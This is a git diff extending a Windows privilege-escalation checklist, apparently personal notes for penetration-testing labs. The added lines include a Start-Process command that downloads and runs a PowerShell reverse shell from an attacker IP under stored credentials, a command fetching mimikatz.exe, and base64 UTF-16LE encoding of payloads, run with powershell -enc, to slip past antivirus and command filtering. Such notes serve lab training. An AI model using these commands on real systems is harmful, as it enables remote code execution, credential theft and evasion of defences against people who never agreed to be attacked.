@@ -17,8 +17,20 @@ If nothing found start the check list.
 
 
 Check List:
-_____________________
+_______________________________________________________________
 
+101. use windows-exploit-suggester.py
+
+`systeminfo > sys.txt`
+
+Transfer sys.txt to kali and use this with the python script.
+
+Example:
+
+`python windows-exploit-suggester.py --database 2019-10-11-mssb.xls --systeminfo sys.txt `
+
+In order to get the database file do `python windows-exploit-suggester.py --update`
+_______________________________________________________________
 NOTE: List files you saw when you enumerated the web and looked intersering. 
 Example:
 
@@ -32,6 +44,7 @@ if so `net user` try the creds against users - maybe it matches.
 Example:
 `runas /user:Administrator cmd.exe`
 Check running process 
+
 1. `ps`
 
 ```
@@ -160,9 +173,39 @@ Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {command}
 
 Get command at the user you prompted 
 
+20. If WinRM isn't available do the same to store creds but use
 
+```
+Start-Process -FilePath "powershell.exe" -Argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')" -Credential $cred
+```
 
+21. Wanna Download something?
 
+```
+IEX(New-Object Net.WebClient).downloadString('URL')
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.28/mimikatz.exe', 'mimikatz.exe')
+```
 
+22. AV on ? Command Filtering ?
 
+```
+cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
+```
+
+or with a command in plain-text:
+
+```
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28/Invoke-PowerShellAdmin.ps1')" | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard
+```
+
+to execute the output use
+
+`powershell -enc`
+
+exmaple :
+Note - not real output of base64 made it shorter for example.
+
+```
+powershell -enc AMAAuADEANAAuADIAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABBAGQAbQB
+```
 
